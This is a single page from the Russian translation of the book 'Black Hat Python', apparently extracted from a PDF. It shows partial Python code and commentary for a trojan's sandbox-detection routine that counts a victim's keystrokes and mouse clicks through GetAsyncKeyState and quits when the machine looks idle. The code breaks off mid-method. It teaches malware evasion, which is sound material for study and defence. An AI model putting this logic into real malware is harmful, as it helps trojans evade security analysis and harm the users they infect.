# Black Hat Python. Программирование для хакеров и пентестеров — страница 170

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

170   Глава 8. Распространенные троянские задачи в Windows
                    self.mouse_clicks += 1
                    return time.time()
                elif i > 32 and i < 127: 
                    self.keystrokes += 1
        return None
Мы создаем класс Detector и обнуляем щелчки и нажатия клавиш. Метод get_
key_press определяет количество щелчков кнопкой мыши, когда они были
сделаны и сколько раз наша жертва нажала клавиши на клавиатуре. Для этого
мы перебираем диапазон допустимых клавиш ввода  и проверяем каждую
из них на предмет нажатия путем вызова функции GetAsyncKeyState . Если
клавиша находится в нажатом состоянии (выражение state & 0x0001 истинно),
мы проверяем, равно ли 0x1  ее значение, соответствующее виртуальному
коду щелчка левой кнопкой мыши. Мы инкрементируем общее количество
щелчков и возвращаем текущую временную метку , чтобы позже рассчитать
время. А также проверяем, нажаты ли на клавиатуре клавиши с печатаемыми
символами (ASCII) , и если да, то просто инкрементируем общее количество
зафиксированных нажатий клавиш.
Т еперь объединим результаты этих функций в основной цикл обнаружения
виртуальных окружений. Добавьте в sandbox_detect.py следующий метод:
    def detect(self):
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35
        max_double_clicks = 10 
        max_keystrokes = random.randint(10,25)
        max_mouse_clicks = random.randint(5,25)
        max_input_threshold = 30000
        last_input = get_last_input() 
        if last_input >= max_input_threshold:
            sys.exit(0)
        detection_complete = False
        while not detection_complete:
            keypress_time = self.get_key_press() 
            if keypress_time is not None and previous_timestamp is not None:
                elapsed = keypress_time - previous_timestamp 
                if elapsed <= double_click_threshold: 
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
